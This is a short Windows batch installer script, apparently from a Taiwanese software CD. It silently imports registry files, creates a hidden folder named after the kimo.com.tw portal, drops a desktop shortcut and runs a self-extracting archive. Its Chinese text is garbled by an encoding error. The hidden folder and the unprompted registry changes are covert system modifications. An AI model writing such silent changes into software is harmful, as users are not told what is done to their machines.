@ECHO OFF

copy 1.reg c:\ > nul
md c:\www.kimo.com.tw
attrib +h c:\www.kimo.com.tw
copy www.kimo.com.tw\main.htm c:\www.kimo.com.tw > nul

SET COPYCMD=/Y
COPY CVIEW.INI C:\ > nul

COPY 2001-10 C:\2001-10.EXE > nul

IF %OS%==Windows_NT Goto WinNT
%winbootdir%\regedit.exe /s r1.reg
%winbootdir%\regedit.exe /s c:\1.reg
COPY CD.PIF C:\WINDOWS\DESKTOP\�ŤѸɩ��u�@��10����ؿ�.PIF > nul
Goto Cont1

:WinNT
%windir%\regedit.exe /s r2.reg
%windir%\regedit.exe /s c:\1.reg
COPY CD.PIF C:\Docume~1\AllUse~1\�ୱ\�ŤѸɩ��u�@��10����ؿ�.PIF > nul

:Cont1
cls

CD\
C:
CD\

ECHO.
ECHO 			�����Y�ɮפ� ... �еy�� ...
ECHO.
ECHO 			�����Y�ɮפ� ... �еy�� ...
ECHO.
ECHO 			�����Y�ɮפ� ... �еy�� ...

2001-10 > nul
DEL C:\2001-10.EXE
CLS
CD 2001-10
CV CV.TXT
CV ORDER.TXT
CV
CD\
CLS
